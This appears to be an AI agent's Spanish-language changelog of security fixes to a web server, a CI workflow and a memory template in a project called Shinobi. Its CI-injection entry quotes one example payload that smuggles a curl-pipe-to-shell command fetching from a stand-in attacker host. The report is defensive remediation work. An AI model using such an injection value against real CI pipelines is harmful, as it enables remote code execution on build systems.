# FIXES_SEC_GAMMA — Security fixes 0.7–0.11

**Fecha:** 2026-06-26
**Agente:** Fix-Sec-Gamma
**Archivos tocados:** 3

---

## FIX 0.7 — Admin dashboard sin autenticación

**Archivo:** `src/web/server.ts` (bloque ~línea 493)

**Problema:** Las rutas `/admin/dashboard`, `/admin/metrics/json` y `/admin/metrics/prom`
se montaban incondicionalmente, sin ningún control de acceso.

**Fix aplicado:** Las tres rutas se envuelven en un bloque condicional que:
1. Lee `process.env.SHINOBI_ADMIN_TOKEN`.
2. Si no está definido, emite `console.warn` y no monta las rutas (fail-closed).
3. Si está definido, registra `app.use('/admin', ...)` que verifica
   `req.headers['x-admin-token']` o `req.query.token` contra el token.
   Devuelve 401 si no coincide.

---

## FIX 0.8 — Host-header injection en A2A agent card

**Archivo:** `src/web/server.ts` (~línea 534 → ahora ~548)

**Problema:** `/.well-known/agent-card.json` construía la URL base con
`req.headers.host`, que un atacante puede forjar para envenenar el discovery A2A.

**Fix aplicado:**
- Se lee `process.env.SHINOBI_PUBLIC_URL` como fuente de verdad.
- En `NODE_ENV === 'production'`: si `SHINOBI_PUBLIC_URL` no está configurada,
  responde 503 con mensaje claro y no revela el host.
- En desarrollo: se permite fallback a `req.headers.host` con `console.warn`.

---

## FIX 0.9 — rawBody HMAC siempre falla

**Archivo:** `src/web/server.ts` (líneas ~192 y ~573)

**Problema:** El HMAC se verificaba sobre `JSON.stringify(req.body)` (objeto ya
parseado), no sobre los bytes originales recibidos. Esto hace que cualquier
verificación HMAC sea incorrecta (falla o se puede bypassear).

**Fix aplicado (dos puntos):**
1. Se añade la opción `verify` a `express.json({ limit: '1mb', verify: ... })`
   para guardar el Buffer crudo en `req.rawBody` antes del parseo JSON.
2. En el handler `POST /a2a`, `rawBody` se obtiene de `(req as any).rawBody`
   (Buffer → string UTF-8) en lugar de `JSON.stringify(req.body)`.

---

## FIX 0.10 — CI script injection en issue_triage.yml

**Archivo:** `.github/workflows/issue_triage.yml` (step "Classify")

**Problema:** `${{ github.event.issue.body }}` se interpolaba directamente en
el script shell del step, permitiendo ejecución arbitraria de comandos si alguien
crea un issue con payload malicioso (ej. `"; curl attacker.com | sh #`).

**Fix aplicado:** Se añaden variables de entorno `ISSUE_TITLE` e `ISSUE_BODY` al
step mediante la clave `env:`. El script usa `$ISSUE_TITLE` y `$ISSUE_BODY`
(expansion de variable de entorno, segura) en lugar de la interpolación directa.

---

## FIX 0.11 — Path hardcodeado de desarrollador en plantilla de memoria

**Archivo:** `src/memory/curated_memory.ts` (línea 65)

**Problema:** La constante `USER_TEMPLATE` contenía la ruta absoluta del
desarrollador original `C:\Users\angel\Desktop\shinobibot` como ejemplo
para todos los usuarios.

**Fix aplicado:** Se reemplaza la ruta literal por `${process.cwd()}`, evaluado
en tiempo de ejecución, que refleja el directorio real del proyecto en el entorno
donde corre Shinobi.

---

## Resumen de cambios por archivo

| Archivo | Cambios |
|---|---|
| `src/web/server.ts` | FIX 0.7 (auth guard admin), FIX 0.8 (host-header), FIX 0.9 (rawBody verify + uso) |
| `.github/workflows/issue_triage.yml` | FIX 0.10 (env var injection guard) |
| `src/memory/curated_memory.ts` | FIX 0.11 (process.cwd() en lugar de ruta dev) |
